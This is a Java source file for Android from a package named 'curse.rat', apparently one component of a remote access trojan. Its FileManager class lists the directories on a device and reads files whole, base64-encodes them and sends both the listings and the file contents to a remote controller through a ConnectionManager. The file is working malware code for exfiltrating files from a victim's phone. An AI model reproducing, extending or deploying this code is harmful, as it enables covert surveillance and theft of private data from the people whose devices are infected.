package com.curse.rat;

import android.util.Base64;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;

public class FileManager {
    private static final String TAG = "FileManager";

    public static void walk(String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                if (!dir.exists()) return;
                File[] files = dir.listFiles();
                JSONArray jsonArray = new JSONArray();
                if (files != null) {
                    for (File file : files) {
                        try {
                            JSONObject jo = new JSONObject();
                            jo.put("name", file.getName());
                            jo.put("isDir", file.isDirectory());
                            jo.put("path", file.getAbsolutePath());
                            jo.put("size", file.length());
                            jsonArray.put(jo);
                        } catch (Exception e) {}
                    }
                }
                JSONObject res = new JSONObject();
                res.put("type", "file_manager");
                res.put("data", jsonArray);
                res.put("path", path);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
                Log.e(TAG, "Walk error: " + e.getMessage());
            }
        }).start();
    }

    public static void download(String path) {
        new Thread(() -> {
            try {
                File file = new File(path);
                if (!file.exists() || file.isDirectory()) return;

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[(int) file.length()];
                fis.read(buffer);
                fis.close();

                String encoded = Base64.encodeToString(buffer, Base64.NO_WRAP);
                JSONObject res = new JSONObject();
                res.put("type", "file_download");
                res.put("name", file.getName());
                res.put("data", encoded);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
                Log.e(TAG, "Download error: " + e.getMessage());
            }
        }).start();
    }
}
